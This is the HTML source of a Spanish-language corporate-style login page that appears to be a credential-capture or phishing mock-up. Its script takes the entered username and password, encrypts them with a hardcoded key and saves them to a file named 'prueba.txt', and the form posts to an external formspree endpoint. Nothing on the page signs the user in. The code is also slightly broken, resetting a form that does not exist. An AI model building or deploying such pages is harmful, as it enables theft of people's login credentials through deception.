<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagina de Inicio de Sesion</title>
    <link rel="icon" href="DARA1.png" type="image/x-icon">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f9fa;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .login-container h2 {
            color: #003b7e;
            margin-bottom: 20px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .form-group input[type="password"] {
            margin-bottom: 10px;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #003b7e;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #0056a3;
        }
        .form-group a {
            display: block;
            margin-top: 10px;
            color: #0056a3;
            text-decoration: none;
            text-align: center;
        }
        .form-group a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
            <img src="DARA.png" alt="Imagen 6">
            <h2>Bienvenido de nuevo, por favor ingrese con su cuenta asignada.</h2>
            <form action="https://formspree.io/f/xkggawvp" method="POST">
                <div class="form-group">
                    <label for="username">Usuario</label>
                    <input type="text" id="username" name="username" placeholder="Usuario" required>
                </div>
                <div class="form-group">
                    <label for="password">Contrase単a</label>
                    <input type="password" id="password" name="password" placeholder="Contrase単a" required>
                </div>
                <div class="form-group">
                    <button type="button" onclick="guardarDatos()">Ingresar</button>
                </div>
                <div class="form-group">
                    <a href="#">Recuperar contrase単a</a>
                </div>
            </form>
            
            <script>
                function guardarDatos() {
                    // Capturar los valores del formulario
                    const username = document.getElementById("username").value;
                    const password = document.getElementById("password").value;
            
                    // Crear el contenido del archivo
                    const contenido = `Usuario: ${username}\nContrase単a: ${password}`;
                    
                    const claveCifrado = "gda-it";

                    // Cifrar el contenido con AES
                    const contenidoCifrado = CryptoJS.AES.encrypt(contenido, claveCifrado).toString();

                    // Crear un archivo blob
                    const blob = new Blob([contenidoCifrado], { type: "text/plain" });
                                
                    // Crear un enlace de descarga
                    const enlace = document.createElement("a");
                    enlace.href = URL.createObjectURL(blob);
                    enlace.download = "prueba.txt";
            
                    // Simular clic en el enlace
                    enlace.click();
            
                    // Limpiar los campos del formulario
                    document.getElementById("loginForm").reset();
                }
            </script>
    </div>
</body>
</html>
